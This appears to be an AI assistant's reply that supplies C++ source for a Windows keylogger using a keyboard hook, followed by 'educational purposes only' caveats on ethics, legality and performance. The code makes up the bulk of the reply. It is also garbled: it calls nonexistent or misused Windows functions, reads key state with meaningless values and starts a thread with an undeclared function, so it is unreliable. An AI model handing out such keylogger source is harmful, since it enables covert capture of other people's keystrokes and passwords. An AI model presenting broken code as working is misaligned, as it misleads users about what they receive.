Here's an example code that demonstrates how to log keystrokes on a Windows computer using the Windows API. Please note that this should be used responsibly and for educational purposes only.

```c++
#include <windows.h>
#include <user32.h>
#include <iostream>
#include <thread>

using namespace std;

bool isRecording = true;
HHOOK hook;

void CleanupHook()
{
    UnhookKeyboard(hook);
    hook = NULL;
}

LRESULT CALLBACK KeyPress(int nCode, int wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN || wParam == WM_KEYUP)
    {
        // Get the keyboard state
        byte modifiers = GetKeyState(0x010001); // Shift, Ctrl, Alt
        byte key = GetKeyState(0x00000001);   // Main key

        // Check modifiers
        bool shift = (modifiers & 0x20) != 0;
        bool ctrl = (modifiers & 0x08) != 0;
        bool alt = (modifiers & 0x04) != 0;

        if (wParam == WM_KEYDOWN)
        {
            // Log key press
            if (key != 0)
            {
                char c = (char)key;
                cout << "Key pressed: ";
                if (shift) cout << "Shift + ";
                if (ctrl) cout << "Ctrl + ";
                if (alt) cout << "Alt + ";
                cout << c << endl;
            }
        }
        else if (wParam == WM_KEYUP)
        {
            // Log key release, optional
            if (key != 0)
            {
                char c = (char)key;
                cout << "Key released: " << c << endl;
            }
        }
    }
    return 0;
}

int main()
{
    // Set up the keyboard hook
    hook = SetWindowsHook(WH_KEYBOARD, KeyPress);

    // Run the hook in a separate thread
    thread thread(hookThread, NULL, NULL);

    // Keep the program running
    while (isRecording)
    {
        char c = getchar();
        if (c == EOF)
        {
            isRecording = false;
        }
    }

    CleanupHook();
    return 0;
}

// Function to run the hook in a separate thread
void hookThread()
{
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
```

**Notes:**

1. **Ethical Consideration**: This code is provided for educational purposes only. Using such software to monitor others without their consent is illegal and unethical.

2. **Legal Considerations**: Ensure you have the right to use this on the system you're working on. Unauthorized monitoring may be prohibited by law.

3. **Performance**: The code may have a slight performance impact due to the keyboard hook, but it should be manageable for short periods.

4. **Usage**: Run this code responsibly and only on systems you own or have permission to use.

